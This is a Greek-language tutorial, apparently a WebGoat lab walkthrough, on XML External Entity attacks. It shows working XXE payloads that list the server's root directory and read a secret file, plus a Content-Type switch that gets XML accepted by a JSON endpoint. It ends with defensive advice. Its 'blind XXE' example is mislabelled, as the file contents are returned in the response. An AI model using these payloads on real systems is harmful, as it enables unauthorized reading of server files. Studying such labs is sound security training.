# Εισαγωγή στην XXE

Η XXE (XML External Entity) είναι μια επίθεση που εκμεταλλεύεται αδυναμίες στην επεξεργασία XML δεδομένων από μια εφαρμογή. Όταν μια εφαρμογή επιτρέπει τη χρήση εξωτερικών οντοτήτων (entities) στο XML και δεν τις φιλτράρει σωστά, ένας επιτιθέμενος μπορεί να τις χρησιμοποιήσει για να αποκτήσει πρόσβαση σε εσωτερικά αρχεία του συστήματος ή να εκτελέσει άλλες κακόβουλες ενέργειες.

---

## Παράδειγμα 1: Απλή XXE Επίθεση

Σε αυτό το παράδειγμα, ο χρήστης στέλνει ένα POST αίτημα με ένα XML σχόλιο. Το αρχικό payload είναι:

```xml
<?xml version="1.0"?>
<comment>
  <text>comment</text>
</comment>
```

### Τροποποίηση για XXE

Για να εκτελέσουμε μια XXE επίθεση, προσθέτουμε μια εξωτερική οντότητα που αναφέρεται στο root directory του συστήματος (`file:///`). Το τροποποιημένο payload είναι:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY root SYSTEM "file:///">
]>
<comment>
  <text>&root;</text>
</comment>
```

- **`<!DOCTYPE root [...]>`**: Ορίζει μια προσαρμοσμένη δομή XML με μια εξωτερική οντότητα.
- **`<!ENTITY root SYSTEM "file:///">`**: Δημιουργεί μια οντότητα με το όνομα `root` που δείχνει στο root directory.
- **`&root;`**: Όταν η εφαρμογή επεξεργάζεται το XML, αντικαθιστά αυτήν την αναφορά με το περιεχόμενο του root directory.

### Αποτέλεσμα

Η εφαρμογή επιστρέφει:

```json
{
  "lessonCompleted": true,
  "feedback": "Congratulations. You have successfully completed the assignment.",
  "output": null
}
```

Επιπλέον, το σχόλιο εμφανίζεται στη σελίδα και περιέχει τη λίστα των αρχείων και φακέλων από το root directory του συστήματος, αποδεικνύοντας ότι η επίθεση πέτυχε.

---

## Παράδειγμα 2: XXE σε Modern REST Framework

Σε αυτό το σενάριο, το POST αίτημα ξεκινάει σε μορφή JSON:

```json
{"text": "comment"}
```

### Αποτυχημένη προσπάθεια με XML

Αν ο χρήστης στείλει το XML payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY root SYSTEM "file:///">
]>
<comment>
  <text>&root;</text>
</comment>
```

η εφαρμογή αποτυγχάνει και επιστρέφει:

```json
{
  "lessonCompleted": false,
  "feedback": "You are posting JSON which does not work with a XXE",
  "output": null
}
```

Αυτό συμβαίνει επειδή η εφαρμογή περιμένει JSON (`Content-Type: application/json`), αλλά το payload είναι XML.

### Διόρθωση με Content-Type

Ο χρήστης αλλάζει το header `Content-Type` σε `application/xml` και στέλνει το ίδιο XML payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY root SYSTEM "file:///">
]>
<comment>
  <text>&root;</text>
</comment>
```

### Αποτέλεσμα

Η εφαρμογή επεξεργάζεται το XML και επιστρέφει:

```json
{
  "lessonCompleted": true,
  "feedback": "Congratulations. You have successfully completed the assignment.",
  "output": null
}
```

Το περιεχόμενο του root directory εμφανίζεται στο σχόλιο, δείχνοντας ότι η επίθεση λειτούργησε.

---

## Παράδειγμα 3: Blind XXE

Στόχος εδώ είναι η ανάκτηση του περιεχομένου του αρχείου `/home/user/.webgoat/XXE/secret.txt`. Το payload είναι:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///home/user/.webgoat/XXE/secret.txt">
]>
<comment>
  <text>XXE goes here. &xxe;</text>
</comment>
```

- **`<!ENTITY xxe SYSTEM ...>`**: Ορίζει μια οντότητα που δείχνει στο συγκεκριμένο αρχείο.
- **`&xxe;`**: Αντικαθίσταται από το περιεχόμενο του `secret.txt`.

### Αποτέλεσμα

Το περιεχόμενο του `secret.txt` εμφανίζεται στο σχόλιο, αποδεικνύοντας την επιτυχία της "blind" XXE επίθεσης.

---

## Συμπεράσματα και Προστασία

Η XXE μπορεί να αποκαλύψει ευαίσθητα δεδομένα ή να οδηγήσει σε περαιτέρω επιθέσεις. Για προστασία:

1. **Απενεργοποιήστε τις εξωτερικές οντότητες**: Ρυθμίστε τον XML parser να μην τις επιτρέπει.
2. **Ελέγξτε τα δεδομένα εισόδου**: Φιλτράρετε μη έγκυρα XML payloads.
3. **Χρησιμοποιήστε JSON**: Είναι ασφαλέστερο καθώς δεν υποστηρίζει εξωτερικές οντότητες.
